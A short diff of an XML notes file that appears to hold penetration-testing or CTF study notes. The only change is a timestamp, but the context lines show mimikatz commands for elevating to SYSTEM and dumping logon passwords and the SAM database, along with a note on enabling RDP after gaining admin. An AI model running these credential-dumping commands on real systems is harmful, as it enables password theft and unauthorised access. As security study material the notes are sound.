@@ -673,7 +673,7 @@ Also check this link: </rich_text>
 token::elevate # this will make us nt_authority</codebox>
         <codebox char_offset="81" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sekurlsa::logonpasswords
 lsadump::sam</codebox>
-        <node name="Good To Do" unique_id="114" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690114316" ts_lastsave="1690114346">
+        <node name="Good To Do" unique_id="114" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690114316" ts_lastsave="1690115966">
           <rich_text>If we have admin we may be able to do more from RDP, so we should enable RDP:
 </rich_text>
           <rich_text link="webs https://cloudzy.com/blog/enable-rdp-cmd/">https://cloudzy.com/blog/enable-rdp-cmd/</rich_text>
